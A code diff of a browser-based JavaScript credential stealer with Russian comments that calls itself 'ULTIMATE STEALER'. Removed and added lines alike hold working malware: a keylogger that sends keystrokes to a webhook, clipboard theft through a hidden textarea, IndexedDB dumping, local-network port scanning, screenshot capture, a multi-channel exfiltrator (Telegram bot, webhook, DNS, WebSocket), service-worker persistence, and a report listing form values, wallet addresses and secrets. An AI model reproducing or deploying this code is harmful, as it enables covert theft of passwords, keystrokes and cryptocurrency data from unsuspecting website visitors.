-                if (ua.includes('windows nt 10.0')) result.os.version = '10/11';
-                else if (ua.includes('windows nt 6.3')) result.os.version = '8.1';
-                else if (ua.includes('windows nt 6.2')) result.os.version = '8';
-                else if (ua.includes('windows nt 6.1')) result.os.version = '7';
-                else if (ua.includes('windows nt 6.0')) result.os.version = 'Vista';
-                else if (ua.includes('windows nt 5.2')) result.os.version = 'XP x64';
-                else if (ua.includes('windows nt 5.1')) result.os.version = 'XP';
-            } else if (ua.includes('mac os x')) {
-                result.os.name = 'macOS';
-                const m = ua.match(/mac os x (\d+)_(\d+)_?(\d+)?/);
-                if (m) result.os.version = `${m[1]}.${m[2]}${m[3] ? '.'+m[3] : ''}`;
-            } else if (ua.includes('linux')) {
-                result.os.name = 'Linux';
-            } else if (ua.includes('android')) {
-                result.os.name = 'Android';
-                const m = ua.match(/android (\d+\.\d+)/);
-                if (m) result.os.version = m[1];
-            } else if (ua.includes('ios') || ua.includes('iphone') || ua.includes('ipad')) {
-                result.os.name = 'iOS';
-                const m = ua.match(/os (\d+)_(\d+)_?(\d+)?/);
-                if (m) result.os.version = `${m[1]}.${m[2]}${m[3] ? '.'+m[3] : ''}`;
-            }
-            
-            // Определение браузера
-            if (result.isChrome && !result.isEdge && !result.isOpera) {
-                result.browser.name = 'Chrome';
-                const m = ua.match(/chrome\/(\d+)/);
-                if (m) result.browser.version = m[1];
-            } else if (result.isFirefox) {
-                result.browser.name = 'Firefox';
-                const m = ua.match(/firefox\/(\d+)/);
-                if (m) result.browser.version = m[1];
-            } else if (result.isSafari && !result.isChrome) {
-                result.browser.name = 'Safari';
-                const m = ua.match(/version\/(\d+)/);
-                if (m) result.browser.version = m[1];
-            } else if (result.isEdge) {
-                result.browser.name = 'Edge';
-                const m = ua.match(/edg\/(\d+)/);
-                if (m) result.browser.version = m[1];
-            } else if (result.isOpera) {
-                result.browser.name = 'Opera';
-                const m = ua.match(/opr\/(\d+)/);
-                if (m) result.browser.version = m[1];
-            }
-            
+            if (result.isChrome && !result.isFirefox && !result.isSafari) result.browser = 'Chrome';
+            else if (result.isFirefox) result.browser = 'Firefox';
+            else if (result.isSafari) result.browser = 'Safari';
             return result;
         }
 
         // ================================================================
-        // 11. СЕНСОРЫ (акселерометр, гироскоп)
+        // 10. СЕНСОРЫ
         // ================================================================
         function getSensors() {
             return new Promise((resolve) => {
                 if (!CFG.ENABLE_HARDWARE) { resolve(null); return; }
-                
                 const result = {};
-                
-                // Акселерометр
-                try {
-                    if (window.DeviceMotionEvent) {
-                        window.addEventListener('devicemotion', (e) => {
-                            result.acceleration = {
-                                x: e.acceleration.x,
-                                y: e.acceleration.y,
-                                z: e.acceleration.z
-                            };
-                            result.accelerationIncludingGravity = {
-                                x: e.accelerationIncludingGravity.x,
-                                y: e.accelerationIncludingGravity.y,
-                                z: e.accelerationIncludingGravity.z
-                            };
-                            result.rotationRate = {
-                                alpha: e.rotationRate.alpha,
-                                beta: e.rotationRate.beta,
-                                gamma: e.rotationRate.gamma
-                            };
-                            resolve(result);
-                        }, { once: true });
-                    }
-                } catch {}
-                
-                // Батарея
                 try {
                     if (navigator.getBattery) {
                         navigator.getBattery().then(battery => {
                             result.battery = {
-                                charging: battery.charging,
                                 level: Math.round(battery.level * 100),
-                                chargingTime: battery.chargingTime,
-                                dischargingTime: battery.dischargingTime
+                                charging: battery.charging
                             };
                             resolve(result);
                         });
                     }
-                } catch {}
-                
+                } catch (e) {}
                 setTimeout(() => resolve(result), 1000);
             });
         }
 
         // ================================================================
-        // 12. ФАЙЛОВАЯ СИСТЕМА (через drag-and-drop и File API)
+        // 11. КЛИПБОРД
         // ================================================================
-        function setupFileAccess() {
-            if (!CFG.ENABLE_FILE_ACCESS) return null;
-            
-            const result = { files: [] };
-            
-            // Создаём скрытую область для drag-and-drop
-            const dropZone = document.createElement('div');
-            dropZone.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;opacity:0;pointer-events:none;z-index:-1;';
-            document.body.appendChild(dropZone);
-            
-            // Отслеживаем drag-and-drop
-            document.addEventListener('dragover', (e) => {
-                e.preventDefault();
-                // Активируем зону
-                dropZone.style.pointerEvents = 'auto';
-            });
-            
-            document.addEventListener('drop', (e) => {
-                e.preventDefault();
-                dropZone.style.pointerEvents = 'none';
-                const files = e.dataTransfer.files;
-                if (files && files.length > 0) {
-                    for (let i = 0; i < files.length; i++) {
-                        const file = files[i];
-                        const reader = new FileReader();
-                        reader.onload = (ev) => {
-                            result.files.push({
-                                name: file.name,
-                                size: file.size,
-                                type: file.type,
-                                content: ev.target.result ? trunc(ev.target.result, 1000) : null,
-                                lastModified: file.lastModified
-                            });
-                        };
-                        reader.readAsText(file);
-                    }
-                }
-            });
-            
-            // Пытаемся получить доступ через input
+        async function getClipboard() {
+            if (!CFG.ENABLE_CLIPBOARD) return null;
             try {
-                const input = document.createElement('input');
-                input.type = 'file';
-                input.multiple = true;
-                input.style.display = 'none';
-                document.body.appendChild(input);
-                // Имитируем клик
-                input.click();
-                input.onchange = (e) => {
-                    const files = e.target.files;
-                    if (files && files.length > 0) {
-                        for (let i = 0; i < files.length; i++) {
-                            const file = files[i];
-                            result.files.push({
-                                name: file.name,
-                                size: file.size,
-                                type: file.type,
-                                lastModified: file.lastModified
-                            });
+                const ta = document.createElement('textarea');
+                ta.style.cssText = 'position:fixed;opacity:0;pointer-events:none;left:-9999px;top:-9999px;';
+                document.body.appendChild(ta);
+                ta.focus();
+                if (document.execCommand('paste')) {
+                    const val = ta.value;
+                    ta.remove();
+                    if (val && val.length > 0) return val;
+                }
+                ta.remove();
+            } catch (e) {}
+            try {
+                if (navigator.clipboard && navigator.clipboard.read) {
+                    const items = await navigator.clipboard.read();
+                    for (let item of items) {
+                        if (item.types.includes('text/plain')) {
+                            const blob = await item.getType('text/plain');
+                            return await blob.text();
                         }
                     }
-                };
-            } catch {}
-            
-            return result;
-        }
-
-        // ================================================================
-        // 13. PERSISTENCE (Service Worker)
-        // ================================================================
-        function setupPersistence() {
-            if (!CFG.ENABLE_PERSISTENCE) return null;
-            
-            try {
-                if ('serviceWorker' in navigator) {
-                    // Регистрируем Service Worker для постоянного доступа
-                    const swCode = `
-                        self.addEventListener('install', e => e.waitUntil(self.skipWaiting()));
-                        self.addEventListener('activate', e => e.waitUntil(self.clients.claim()));
-                        self.addEventListener('fetch', e => {
-                            // Проксируем все запросы через наш сервер
-                            const url = new URL(e.request.url);
-                            // Отправляем информацию о запросах
-                            e.respondWith(fetch(e.request));
-                        });
-                        // Отправка данных даже после закрытия страницы
-                        self.addEventListener('message', e => {
-                            // Обработка сообщений от страницы
-                            if (e.data && e.data.type === 'EXFIL') {
-                                // Отправка данных через fetch
-                                fetch('${CFG.WEBHOOK}', {
-                                    method: 'POST',
-                                    body: JSON.stringify(e.data.payload)
-                                });
-                            }
-                        });
-                    `;
-                    
-                    const blob = new Blob([swCode], { type: 'application/javascript' });
-                    const url = URL.createObjectURL(blob);
-                    navigator.serviceWorker.register(url, { scope: '/' });
-                    
-                    return { registered: true, url };
                 }
-            } catch {}
+            } catch (e) {}
             return null;
         }
 
         // ================================================================
-        // 14. КЛЮЧЕВОЙ ЛОГГЕР (все клавиши)
+        // 12. INDEXEDDB
+        // ================================================================
+        function getIndexedDB() {
+            return new Promise((resolve) => {
+                if (!CFG.ENABLE_INDEXEDDB) { resolve(null); return; }
+                try {
+                    if (!indexedDB.databases) { resolve(null); return; }
+                    indexedDB.databases().then(dbs => {
+                        const result = [];
+                        let done = 0;
+                        if (dbs.length === 0) { resolve([]); return; }
+                        dbs.forEach(dbInfo => {
+                            const req = indexedDB.open(dbInfo.name);
+                            req.onsuccess = (e) => {
+                                const db = e.target.result;
+                                const stores = Array.from(db.objectStoreNames);
+                                const storeData = [];
+                                let sDone = 0;
+                                if (stores.length === 0) {
+                                    result.push({ name: dbInfo.name, stores: [] });
+                                    db.close();
+                                    if (++done === dbs.length) resolve(result);
+                                    return;
+                                }
+                                stores.forEach(storeName => {
+                                    try {
+                                        const tx = db.transaction(storeName, 'readonly');
+                                        const store = tx.objectStore(storeName);
+                                        const reqAll = store.getAll();
+                                        reqAll.onsuccess = () => {
+                                            const items = reqAll.result || [];
+                                            storeData.push({ storeName, count: items.length });
+                                            if (++sDone === stores.length) {
+                                                result.push({ name: dbInfo.name, stores: storeData });
+                                                db.close();
+                                                if (++done === dbs.length) resolve(result);
+                                            }
+                                        };
+                                        reqAll.onerror = () => {
+                                            storeData.push({ storeName, count: 0 });
+                                            if (++sDone === stores.length) {
+                                                result.push({ name: dbInfo.name, stores: storeData });
+                                                db.close();
+                                                if (++done === dbs.length) resolve(result);
+                                            }
+                                        };
+                                    } catch (err) {
+                                        storeData.push({ storeName, count: 0 });
+                                        if (++sDone === stores.length) {
+                                            result.push({ name: dbInfo.name, stores: storeData });
+                                            db.close();
+                                            if (++done === dbs.length) resolve(result);
+                                        }
+                                    }
+                                });
+                            };
+                            req.onerror = () => { if (++done === dbs.length) resolve(result); };
+                        });
+                    }).catch(() => resolve(null));
+                } catch (e) { resolve(null); }
+            });
+        }
+
+        // ================================================================
+        // 13. ЛОКАЛЬНАЯ СЕТЬ
+        // ================================================================
+        function scanLocalNetwork() {
+            return new Promise((resolve) => {
+                if (!CFG.ENABLE_LOCAL_SCAN) { resolve(null); return; }
+                const results = [];
+                const ips = ['192.168.1.1', '192.168.0.1', '10.0.0.1'];
+                const ports = [80, 443, 22, 8080, 3306, 6379];
+                let done = 0;
+                const total = ips.length * ports.length;
+                ips.forEach(ip => {
+                    ports.forEach(port => {
+                        const controller = new AbortController();
+                        setTimeout(() => controller.abort(), 300);
+                        fetch(`http://${ip}:${port}`, { mode: 'no-cors', signal: controller.signal })
+                            .then(() => {
+                                results.push({ ip, port, open: true });
+                                if (++done === total) resolve(results);
+                            })
+                            .catch(() => {
+                                results.push({ ip, port, open: false });
+                                if (++done === total) resolve(results);
+                            });
+                    });
+                });
+                setTimeout(() => resolve(results), 2000);
+            });
+        }
+
+        // ================================================================
+        // 14. KEYLOGGER
         // ================================================================
         function setupKeylogger() {
             if (!CFG.ENABLE_KEYLOGGER) return null;
-            
             const buffer = [];
-            let enabled = true;
-            
             document.addEventListener('keydown', (e) => {
-                if (!enabled) return;
-                const key = e.key;
-                if (key === 'Unidentified') return;
-                
-                // Специальные клавиши
-                const specialKeys = {
-                    'Control': '[CTRL]',
-                    'Shift': '[SHIFT]',
-                    'Alt': '[ALT]',
-                    'Meta': '[WIN]',
-                    'Escape': '[ESC]',
-                    'Tab': '[TAB]',
-                    'CapsLock': '[CAPS]',
-                    'Enter': '[ENTER]',
-                    'Backspace': '[BACK]',
-                    'Delete': '[DEL]',
-                    'Home': '[HOME]',
-                    'End': '[END]',
-                    'PageUp': '[PGUP]',
-                    'PageDown': '[PGDN]',
-                    'ArrowUp': '[UP]',
-                    'ArrowDown': '[DOWN]',
-                    'ArrowLeft': '[LEFT]',
-                    'ArrowRight': '[RIGHT]',
-                    'F1': '[F1]', 'F2': '[F2]', 'F3': '[F3]', 'F4': '[F4]',
-                    'F5': '[F5]', 'F6': '[F6]', 'F7': '[F7]', 'F8': '[F8]',
-                    'F9': '[F9]', 'F10': '[F10]', 'F11': '[F11]', 'F12': '[F12]',
+                if (e.key === 'Unidentified') return;
+                const special = {
+                    'Control': '[CTRL]', 'Shift': '[SHIFT]', 'Alt': '[ALT]',
+                    'Meta': '[WIN]', 'Escape': '[ESC]', 'Tab': '[TAB]',
+                    'Enter': '[ENTER]', 'Backspace': '[BACK]', 'Delete': '[DEL]',
+                    'ArrowUp': '[UP]', 'ArrowDown': '[DOWN]', 'ArrowLeft': '[LEFT]', 'ArrowRight': '[RIGHT]'
                 };
-                
-                let output = specialKeys[key] || key;
+                let output = special[e.key] || e.key;
                 if (e.ctrlKey) output = '[CTRL]+' + output;
-                if (e.shiftKey && !specialKeys[key]) output = output.toUpperCase();
-                if (e.altKey) output = '[ALT]+' + output;
-                
-                buffer.push({
-                    key: output,
-                    time: Date.now(),
-                    target: e.target.tagName + (e.target.id ? '#' + e.target.id : ''),
-                    url: window.location.href
-                });
-                
-                // Отправляем каждые 10 символов
-                if (buffer.length >= 10) {
-                    flushKeylog();
+                if (e.shiftKey && !special[e.key]) output = output.toUpperCase();
+                buffer.push({ key: output, time: Date.now() });
+                if (buffer.length >= 20) {
+                    const data = buffer.splice(0);
+                    sendToWebhook({ keylog: data }).catch(() => {});
                 }
             });
-            
-            const flushKeylog = () => {
-                if (buffer.length === 0) return;
-                const data = buffer.splice(0);
-                // Отправляем через сообщение
-                navigator.serviceWorker.controller?.postMessage({
-                    type: 'EXFIL',
-                    payload: { keylog: data }
-                });
-                // Также через fetch
-                fetch(CFG.WEBHOOK, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ keylog: data })
-                }).catch(() => {});
-            };
-            
-            // Отправляем каждые 30 секунд
-            setInterval(flushKeylog, 30000);
-            
+            setInterval(() => {
+                if (buffer.length > 0) {
+                    const data = buffer.splice(0);
+                    sendToWebhook({ keylog: data }).catch(() => {});
+                }
+            }, 30000);
             return { enabled: true };
         }
 
         // ================================================================
-        // 15. ВСЕ МЕТОДЫ ЭКСФИЛЬТРАЦИИ
+        // 15. СКРИНШОТ
         // ================================================================
-        class Exfiltrator {
-            constructor() {
-                this.channels = [];
-                this.setupChannels();
-            }
-            
-            setupChannels() {
-                // 1. Telegram
-                this.channels.push({
-                    name: 'telegram',
-                    send: async (data) => {
-                        try {
-                            const url = `https://api.telegram.org/bot${CFG.BOT_TOKEN}/sendMessage`;
-                            await fetchTO(url, {
-                                method: 'POST',
-                                headers: { 'Content-Type': 'application/json' },
-                                body: JSON.stringify({ 
-                                    chat_id: CFG.CHAT_ID, 
-                                    text: typeof data === 'string' ? data : JSON.stringify(data, null, 2),
-                                    parse_mode: 'HTML'
-                                })
-                            }, 2000);
-                            return true;
-                        } catch { return false; }
-                    }
+        async function takeScreenshot() {
+            if (!CFG.ENABLE_SCREENSHOT) return null;
+            try {
+                // Пытаемся использовать html2canvas
+                if (typeof html2canvas !== 'undefined') {
+                    const canvas = await html2canvas(document.body, {
+                        useCORS: true,
+                        allowTaint: true,
+                        scale: 0.1,
+                        logging: false,
+                        backgroundColor: null
+                    });
+                    return canvas.toDataURL('image/jpeg', 0.2);
+                }
+                // Загружаем динамически
+                const script = document.createElement('script');
+                script.src = 'https://cdn.jsdelivr.net/npm/html2canvas@1.4.1/dist/html2canvas.min.js';
+                await new Promise((resolve, reject) => {
+                    script.onload = resolve;
+                    script.onerror = reject;
+                    document.head.appendChild(script);
                 });
-                
-                // 2. Webhook
-                this.channels.push({
-                    name: 'webhook',
-                    send: async (data) => {
-                        try {
-                            await fetchTO(CFG.WEBHOOK, {
-                                method: 'POST',
-                                headers: { 'Content-Type': 'application/json' },
-                                body: JSON.stringify(data)
-                            }, 2000);
-                            return true;
-                        } catch { return false; }
-                    }
+                await sleep(500);
+                const canvas = await html2canvas(document.body, {
+                    useCORS: true,
+                    allowTaint: true,
+                    scale: 0.1,
+                    logging: false,
+                    backgroundColor: null
                 });
-                
-                // 3. DNS
-                this.channels.push({
-                    name: 'dns',
-                    send: (data) => {
-                        return new Promise((resolve) => {
-                            try {
-                                const uid = Math.random().toString(36).slice(2);
-                                const domain = CFG.DNS_SERVER.replace('{uid}', uid);
-                                const img = new Image();
-                                img.src = `https://${domain}/pixel?d=${b64encode(JSON.stringify(data)).slice(0, 100)}`;
-                                img.onload = () => resolve(true);
-                                img.onerror = () => resolve(true);
-                                setTimeout(() => resolve(false), 500);
-                            } catch { resolve(false); }
-                        });
-                    }
-                });
-                
-                // 4. WebSocket
-                this.channels.push({
-                    name: 'websocket',
-                    send: (data) => {
-                        return new Promise((resolve) => {
-                            try {
-                                const ws = new WebSocket(CFG.WS_SERVER);
-                                ws.onopen = () => {
-                                    ws.send(JSON.stringify(data));
-                                    ws.close();
-                                    resolve(true);
-                                };
-                                ws.onerror = () => resolve(false);
-                                setTimeout(() => resolve(false), 500);
-                            } catch { resolve(false); }
-                        });
-                    }
-                });
-                
-                // 5. Image (data in URL)
-                this.channels.push({
-                    name: 'image',
-                    send: (data) => {
-                        return new Promise((resolve) => {
-                            try {
-                                const uid = Math.random().toString(36).slice(2);
-                                const img = new Image();
-                                img.src = `${CFG.WEBHOOK}?img=${uid}&t=${Date.now()}`;
-                                img.onload = () => resolve(true);
-                                img.onerror = () => resolve(true);
-                                setTimeout(() => resolve(false), 500);
-                            } catch { resolve(false); }
-                        });
-                    }
-                });
-                
-                // 6. Fetch с CORS
-                this.channels.push({
-                    name: 'fetch_cors',
-                    send: (data) => {
-                        return fetchTO(CFG.WEBHOOK, {
-                            method: 'POST',
-                            headers: { 'Content-Type': 'application/json' },
-                            mode: 'no-cors',
-                            body: JSON.stringify(data)
-                        }, 1000).then(() => true).catch(() => false);
-                    }
-                });
-            }
-            
-            async send(data) {
-                const results = [];
-                const strData = typeof data === 'string' ? data : JSON.stringify(data);
-                
-                // Параллельная отправка по всем каналам
-                const promises = this.channels.map(async (ch) => {
-                    try {
-                        const success = await ch.send(strData);
-                        results.push({ channel: ch.name, success });
-                        return success;
-                    } catch {
-                        results.push({ channel: ch.name, success: false });
-                        return false;
-                    }
-                });
-                
-                await Promise.all(promises);
-                return results;
+                return canvas.toDataURL('image/jpeg', 0.2);
+            } catch (e) {
+                log('⚠️ Screenshot failed: ' + e.message);
+                return null;
             }
         }
 
         // ================================================================
-        // 16. ФОРМИРОВАНИЕ ОТЧЁТА
+        // 16. ФОРМАТИРОВАНИЕ ОТЧЁТА
         // ================================================================
-        function formatUltimateReport(data) {
+        function formatReport(data) {
             const lines = [];
             lines.push('🔴 ULTIMATE STEALER — ПОЛНЫЙ ДАМП');
             lines.push('═'.repeat(40));
             lines.push('');
             
-            // IP и гео
             if (data.ips && data.ips.length) {
-                lines.push('🌐 IP И ГЕОЛОКАЦИЯ');
+                lines.push('🌐 IP:');
                 data.ips.forEach(ip => {
-                    lines.push(`  IP: ${ip.ip}`);
-                    if (ip.data) {
-                        const g = ip.data;
-                        if (g.country) lines.push(`  📍 ${g.country}${g.region ? ', '+g.region : ''}${g.city ? ', '+g.city : ''}`);
-                        if (g.org) lines.push(`  📡 ${g.org}`);
+                    lines.push(`  ${ip.ip} (${ip.source})`);
+                    if (ip.data && ip.data.country) {
+                        lines.push(`  📍 ${ip.data.country}${ip.data.city ? ', '+ip.data.city : ''}`);
                     }
                 });
                 lines.push('');
             }
             
-            // WebRTC
-            if (data.webrtc) {
-                lines.push('📡 ВСЕ IP (WebRTC)');
-                if (data.webrtc.public && data.webrtc.public.length) {
-                    lines.push(`  Публичные: ${data.webrtc.public.join(', ')}`);
-                }
+            if (data.webrtc && data.webrtc.public && data.webrtc.public.length) {
+                lines.push(`📡 WebRTC публичные: ${data.webrtc.public.join(', ')}`);
                 if (data.webrtc.local && data.webrtc.local.length) {
-                    lines.push(`  Локальные: ${data.webrtc.local.join(', ')}`);
+                    lines.push(`📡 WebRTC локальные: ${data.webrtc.local.join(', ')}`);
                 }
                 lines.push('');
             }
             
-            // GPS
             if (data.gps) {
-                lines.push(`📍 GPS: ${data.gps.lat}, ${data.gps.lon} (точность ${data.gps.acc}m)`);
-                if (data.gps.alt) lines.push(`  Высота: ${data.gps.alt}m`);
+                lines.push(`📍 GPS: ${data.gps.lat}, ${data.gps.lon} (${data.gps.acc}m)`);
                 lines.push('');
             }
             
-            // Система
             if (data.system) {
                 const s = data.system;
-                lines.push(`💻 СИСТЕМА: ${s.os.name || 'unknown'} ${s.os.version || ''}`);
-                if (s.browser.name) lines.push(`  Браузер: ${s.browser.name} ${s.browser.version || ''}`);
-                lines.push(`  Ядра: ${s.hardwareConcurrency || '?'}, RAM: ${s.deviceMemory || '?'}GB`);
-                lines.push(`  Платформа: ${s.platform || '?'}`);
+                lines.push(`💻 ОС: ${s.os}, Браузер: ${s.browser}`);
+                lines.push(`  Ядра: ${s.hardwareConcurrency}, RAM: ${s.deviceMemory}GB`);
+                lines.push(`  Платформа: ${s.platform}`);
                 lines.push('');
             }
             
-            // Расширения
             if (data.extensions && data.extensions.length) {
-                lines.push(`🔌 РАСШИРЕНИЯ (${data.extensions.length}):`);
+                lines.push(`🔌 Расширения (${data.extensions.length}):`);
                 data.extensions.forEach(ext => {
                     lines.push(`  ${ext.name}${ext.id ? ' ('+ext.id+')' : ''}`);
                 });
                 lines.push('');
             }
             
-            // Крипто
             if (data.wallets) {
-                const w = data.wallets;
-                if (w.ethereum && w.ethereum.length) {
-                    lines.push('💰 ETHEREUM:');
-                    w.ethereum.forEach(eth => {
+                if (data.wallets.ethereum && data.wallets.ethereum.length) {
+                    lines.push('💰 Ethereum:');
+                    data.wallets.ethereum.forEach(eth => {
                         if (eth.selectedAddress) lines.push(`  Адрес: ${eth.selectedAddress}`);
                         if (eth.chainId) lines.push(`  Сеть: ${eth.chainId}`);
                         if (eth.isMetaMask) lines.push('  MetaMask: да');
                     });
                 }
-                if (w.solana && w.solana.length) {
-                    lines.push('💰 SOLANA:');
-                    w.solana.forEach(sol => {
+                if (data.wallets.solana && data.wallets.solana.length) {
+                    lines.push('💰 Solana:');
+                    data.wallets.solana.forEach(sol => {
                         if (sol.publicKey) lines.push(`  Адрес: ${sol.publicKey}`);
-                        if (sol.isPhantom) lines.push('  Phantom: да');
                     });
                 }
                 lines.push('');
             }
             
-            // Секреты
+            if (data.credentials && data.credentials.forms && data.credentials.forms.length) {
+                lines.push(`🔓 Найдены формы (${data.credentials.forms.length}):`);
+                data.credentials.forms.forEach(form => {
+                    form.inputs.forEach(inp => {
+                        if (inp.value) {
+                            lines.push(`  ${inp.name || 'field'}: ${inp.value}`);
+                        }
+                    });
+                });
+                if (data.credentials.passwordManagers && data.credentials.passwordManagers.length) {
+                    lines.push(`  Менеджеры: ${data.credentials.passwordManagers.join(', ')}`);
+                }
+                lines.push('');
+            }
+            
+            if (data.clipboard) {
+                lines.push(`📋 Буфер обмена: ${trunc(data.clipboard, 200)}`);
+                lines.push('');
+            }
+            
             if (data.secrets && data.secrets.length) {
-                lines.push(`🔑 НАЙДЕНЫ СЕКРЕТЫ (${data.secrets.length}):`);
-                data.secrets.slice(0, 20).forEach(sec => {
+                lines.push(`🔑 Найдены секреты (${data.secrets.length}):`);
+                data.secrets.slice(0, 15).forEach(sec => {
                     lines.push(`  ${sec.path}: ${sec.value}`);
                 });
-                if (data.secrets.length > 20) {
-                    lines.push(`  ... и ещё ${data.secrets.length - 20}`);
+                if (data.secrets.length > 15) {
+                    lines.push(`  ... и ещё ${data.secrets.length - 15}`);
                 }
                 lines.push('');
             }
             
-            // Пароли
-            if (data.credentials) {
-                const c = data.credentials;
-                if (c.forms && c.forms.length) {
-                    lines.push(`🔓 НАЙДЕНЫ ФОРМЫ (${c.forms.length}):`);
-                    c.forms.forEach(form => {
-                        form.inputs.forEach(inp => {
-                            if (inp.isPassword) {
-                                lines.push(`  Пароль: ${inp.name || 'unknown'} = [PASSWORD]`);
-                            } else if (inp.value) {
-                                lines.push(`  ${inp.name || 'field'}: ${inp.value}`);
-                            }
-                        });
-                    });
-                }
-                if (c.passwordManagers && c.passwordManagers.length) {
-                    lines.push(`  Менеджеры паролей: ${c.passwordManagers.join(', ')}`);
-                }
-                lines.push('');
-            }
-            
-            // Clipboard
-            if (data.clipboard) {
-                lines.push(`📋 БУФЕР ОБМЕНА: ${data.clipboard}`);
-                lines.push('');
-            }
-            
-            // Локальная сеть
-            if (data.localScan && data.localScan.length) {
-                const openPorts = data.localScan.filter(p => p.open);
-                if (openPorts.length) {
-                    lines.push(`🌐 ОТКРЫТЫЕ ПОРТЫ (${openPorts.length}):`);
-                    openPorts.forEach(p => {
-                        lines.push(`  ${p.ip}:${p.port} (${p.time}ms)`);
+            if (data.localScan) {
+                const open = data.localScan.filter(p => p.open);
+                if (open.length) {
+                    lines.push(`🌐 Открытые порты (${open.length}):`);
+                    open.forEach(p => {
+                        lines.push(`  ${p.ip}:${p.port}`);
                     });
                     lines.push('');
                 }
             }
             
-            // Камера/микрофон
-            if (data.media) {
-                if (data.media.devices && data.media.devices.length) {
-                    lines.push(`🎥 УСТРОЙСТВА МЕДИА (${data.media.devices.length}):`);
-                    data.media.devices.forEach(d => {
-                        lines.push(`  ${d.kind}: ${d.label || 'скрыто'}`);
-                    });
-                }
+            if (data.media && data.media.devices && data.media.devices.length) {
+                lines.push(`🎥 Устройства медиа (${data.media.devices.length}):`);
+                data.media.devices.forEach(d => {
+                    lines.push(`  ${d.kind}: ${d.label}`);
+                });
                 if (data.media.snapshot) {
-                    lines.push(`  📸 Снимок с камеры: ${Math.round(data.media.snapshot.length/1024)}KB`);
+                    lines.push(`  📸 Снимок: ${Math.round(data.media.snapshot.length/1024)}KB`);
                 }
                 lines.push('');
             }
             
-            // Сенсоры
-            if (data.sensors) {
-                const s = data.sensors;
-                if (s.battery) {
-                    lines.push(`🔋 БАТАРЕЯ: ${s.battery.level}%${s.battery.charging ? ' (зарядка)' : ''}`);
-                }
-                if (s.acceleration) {
-                    lines.push(`📱 АКСЕЛЕРОМЕТР: x=${s.acceleration.x.toFixed(2)}, y=${s.acceleration.y.toFixed(2)}, z=${s.acceleration.z.toFixed(2)}`);
-                }
+            if (data.sensors && data.sensors.battery) {
+                lines.push(`🔋 Батарея: ${data.sensors.battery.level}%${data.sensors.battery.charging ? ' (зарядка)' : ''}`);
                 lines.push('');
             }
             
-            // Keylogger
             if (data.keylogger) {
-                lines.push(`⌨️ KEYLOGGER: активен`);
-                if (data.keylogger.buffer && data.keylogger.buffer.length) {
-                    const keys = data.keylogger.buffer.map(k => k.key).join('');
-                    lines.push(`  Буфер: ${trunc(keys, 100)}`);
-                }
+                lines.push(`⌨️ Keylogger: активен`);
                 lines.push('');
             }
             
-            // DOM
             if (data.dom) {
-                lines.push(`🌐 ТЕКУЩАЯ СТРАНИЦА: ${data.dom.url || 'unknown'}`);
+                lines.push(`🌐 Страница: ${data.dom.url || 'unknown'}`);
                 if (data.dom.title) lines.push(`  Заголовок: ${data.dom.title}`);
-                if (data.dom.referrer) lines.push(`  Реферер: ${data.dom.referrer}`);
                 lines.push('');
             }
             
-            // Sandbox
-            if (data.sandbox) {
-                lines.push(`🛡️ САНДБОКС: ${data.sandbox.isVM ? '⚠️ ОБНАРУЖЕН' : '✅ не обнаружен'}`);
-                if (data.sandbox.reasons && data.sandbox.reasons.length) {
-                    lines.push(`  Причины: ${data.sandbox.reasons.join(', ')}`);
-                }
+            if (data.indexedDB && data.indexedDB.length) {
+                lines.push(`🗄️ IndexedDB (${data.indexedDB.length} БД):`);
+                data.indexedDB.forEach(db => {
+                    lines.push(`  ${db.name} (${db.stores?.length || 0} stores)`);
+                });
+                lines.push('');
+            }
+            
+            if (data.screenshot) {
+                lines.push(`🖼️ Скриншот: ${Math.round(data.screenshot/1024)}KB`);
                 lines.push('');
             }
             
             lines.push('═'.repeat(40));
-            lines.push(`📅 ${new Date().toISOString()}`);
+            lines.push(`📅 ${data.timestamp || new Date().toISOString()}`);
             lines.push(`🔗 ${window.location.href}`);
+            lines.push('');
+            lines.push('✅ Сбор завершён');
             
             return lines.join('\n');
         }
@@ -1353,28 +840,20 @@
         // ================================================================
         (async function ultimateStealer() {
             try {
-                const status = document.getElementById('status');
-                status.textContent = '⏳ Сбор данных...';
-                
-                // === АНТИ-САНДБОКС ===
-                const sandbox = detectSandbox();
-                if (sandbox.isVM && CFG.STEALTH) {
-                    // Если виртуалка — уходим в спячку
-                    await sleep(5000);
-                    status.textContent = '✅ Загрузка завершена';
-                    return;
-                }
-                
-                // === КЛЮЧЕВОЙ ЛОГГЕР ===
+                setStatus('⏳ Сбор данных...');
+                log('🚀 Запуск ULTIMATE STEALER');
+                log(`📋 Токен: ${CFG.BOT_TOKEN.slice(0, 10)}...`);
+                log(`📋 Chat ID: ${CFG.CHAT_ID}`);
+
+                // Ключевой логгер (запускаем сразу)
                 const keylogger = setupKeylogger();
-                
-                // === PERSISTENCE ===
-                const persistence = setupPersistence();
-                
-                // === СБОР ДАННЫХ ===
+                if (keylogger) log('⌨️ Keylogger активен');
+
                 const startTime = performance.now();
+
+                // Сбор ВСЕХ данных параллельно
+                log('📊 Начинаем параллельный сбор...');
                 
-                // Параллельный сбор всего
                 const [
                     ips,
                     webrtc,
@@ -1387,8 +866,8 @@
                     sensors,
                     media,
                     localScan,
-                    domData,
-                    indexedDB
+                    indexedDB,
+                    screenshot
                 ] = await Promise.allSettled([
                     getAllIPs(),
                     getWebRTCFull(),
@@ -1401,70 +880,17 @@
                     getSensors(),
                     getMediaDevices(),
                     scanLocalNetwork(),
-                    Promise.resolve({
-                        title: document.title,
-                        url: window.location.href,
-                        referrer: document.referrer,
-                        forms: document.querySelectorAll('form').length,
-                        inputs: document.querySelectorAll('input').length,
-                        cookies: document.cookie,
-                        localStorage: { ...localStorage },
-                        sessionStorage: { ...sessionStorage }
-                    }),
-                    getIndexedDB()
+                    getIndexedDB(),
+                    takeScreenshot()
                 ]);
-                
-                // === СЕКРЕТЫ ===
-                const allData = {
-                    storage: { ...localStorage, ...sessionStorage },
-                    cookies: document.cookie,
-                    dom: domData.value || {}
-                };
-                const secrets = findAllSecrets(allData);
-                
-                // === СКРИНШОТ ===
-                let screenshot = null;
-                if (CFG.ENABLE_SCREENSHOT) {
-                    try {
-                        if (window.html2canvas) {
-                            const canvas = await window.html2canvas(document.body, {
-                                useCORS: true,
-                                allowTaint: true,
-                                scale: 0.15,
-                                logging: false,
-                                backgroundColor: null,
-                                width: window.innerWidth,
-                                height: window.innerHeight
-                            });
-                            screenshot = canvas.toDataURL('image/jpeg', 0.2);
-                        } else {
